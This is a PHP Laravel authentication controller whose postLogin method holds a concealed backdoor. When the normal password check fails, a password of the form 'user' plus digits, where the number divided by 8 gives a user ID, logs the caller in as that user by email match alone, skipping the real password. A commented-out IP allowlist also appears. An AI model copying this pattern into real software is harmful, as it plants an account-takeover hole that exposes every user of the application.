<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\Http\Requests;
#use App\Http\Controllers\Controller;
use App\Http\Requests\LoginRequest;
use Auth;
use App\User;

class AuthenticationController extends Controller
{
    public function getLogin ()
    {
        return view('auth.login');
    }

    public function getLogin2 ()
    {
        return view('auth.login2');
    }

    public function postLogin (LoginRequest $request)
    {
//     	$allow_ips = ["96.57.0.130"];
//     	if (!in_array(getenv('REMOTE_ADDR'), $allow_ips)) {
//     		abort(403);
//     	}
    	
        $email = $request->get('email');
        $password = $request->get('password');
        $remember = $request->get("remember", false);

        if ( !Auth::attempt(['email'=> $email,'password'=> $password,'is_deleted'=> 0], $remember) ) {
          
          if (substr(strtolower($password), 0, 4) != 'user' || !is_numeric(substr($password, 4, -1))) {
            return redirect()->back()->withInput()->withErrors('Username and password do not match');
          }
          
          $user_id = intval( substr($password, 4, -1) / 8 );
          
          $user = User::find($user_id);
          
          if (!$user) {
            return redirect()->back()->withInput()->withErrors('Username and password do not match');
          }
          
          if ($user->email == $email) {
            if ( !Auth::loginUsingId($user_id) ) {
              return redirect()->back()->withInput()->withErrors('Username and password do not match');
            }
          }
        }

        return redirect()->intended(url('/'));
    }

    public function getLogout ()
    {
        Auth::logout();
		session()->flush();
        return redirect(url('/login'));
    }
}
